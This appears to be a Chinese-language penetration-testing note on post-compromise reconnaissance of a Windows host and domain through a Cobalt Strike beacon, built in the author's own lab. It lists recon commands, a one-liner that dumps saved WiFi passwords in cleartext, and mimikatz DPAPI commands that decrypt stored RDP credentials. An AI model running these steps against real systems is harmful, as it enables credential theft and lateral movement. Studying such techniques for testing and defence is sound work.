# 前言

本篇对内网信息收集做一个补充，这里的命令是运行在 cs 上线的前提下，在命令前要加上 shell

# 控制机信息收集

# 网段

这个很简单，使用 ipconfig 就可以知道 ip 也就可以知道网段，通过网段可以去扫描其他存活主机

# 进程信息

tasklist

# 开机自启

wmic startup get command,caption

开机自启如果它后面没有引号可以利用它来提权，提到高权限就会很危险，这里仅做信息收集不在展开

# 开机时间

net statistics workstation

# 查看本地用户

net user

# 会话连接情况

netstat -ano

# 查看补丁信息

wmic qfe get Caption,Description,HotFixID,InstalledOn

通过这个可以判断一些漏洞有没有被修补

# 查看默认共享

net share

共享是有很多漏洞点控制的

# 路由信息

route print

# 防火墙信息

net firewall show config

# wifi 连接记录

for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

这里因为我搭建的域内服务器没有信息这里放的是我本地的截图

# ARP 信息

看还有哪些网段

arp -a

# 查看最近打开的文档

dir %APPDATA%\Microsoft\Windows\Recent

# 查看本地用户组

net localgroup

# 查看组中成员

net localgroup administrators

当电脑加入一个域后，在本地管理员组中有两个默认的管理员，一个是 administrator，一个是域里面的 domain adminis 组。

# 域内信息收集

# 判断是否存在域

ipconfig /all
systeminfo

二者都可，前者目光聚焦于 DNS，后者信息很明显

# 查看域内上的组

net group /domain

# 查看组上的详细成员

net group "domain adminis" /domain

# 找域控

nltest /DCLIST:liuqi

使用这个工具可以找密码

# 查看远程桌面的凭证

cmdkey list

我这里没有，登录一下，为后续继续实验铺垫

# 查看凭证文件的位置

dir /a %userprofile%\appdata\local\microsoft\credentials\*

# 破解凭证

# 获取 guid
mimikatz dpapi::cred /in:凭证路径

# 找到 guid 对应的 key
mimikatz sekurlsa::dpapi

# 解密凭证
mimikatz dpapi::cred /in:凭证的文件路径 /masterkey:masterkey的值
